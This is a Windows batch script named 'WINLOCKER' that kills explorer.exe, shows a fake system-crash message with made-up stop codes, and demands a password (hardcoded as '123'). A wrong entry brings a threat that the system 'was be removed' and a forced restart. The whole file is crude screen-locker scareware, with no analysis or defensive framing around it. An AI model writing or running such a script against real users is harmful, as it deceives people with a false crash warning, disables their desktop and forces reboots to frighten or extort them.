@echo off
Taskkill/f /im explorer.exe
Title WINLOCKER
color 4


echo error
echo 0000000x00000000000)))))error echo system 32:0000000x000120)))(
echo Technical Information:

echo *** STOP: 0x1000007e 
echo (0xffffffffc0000005, 
echo 0xfffff80002e55151, 
echo 0xfffff880009a99d8,
echo 0xfffff880009a9230)
echo *** xNtKrnl.exe - Address 
echo 0xfffff80002e55151 base at echo 0xfffff80002e0d000 DateStamp
echo 0x4ce7951a
echo Enter password

:h
set/p x=
if %x%==123 (echo win start
start explorer
exit
) else (
echo Your sistem was be removed!
shutdown /r
)
goto h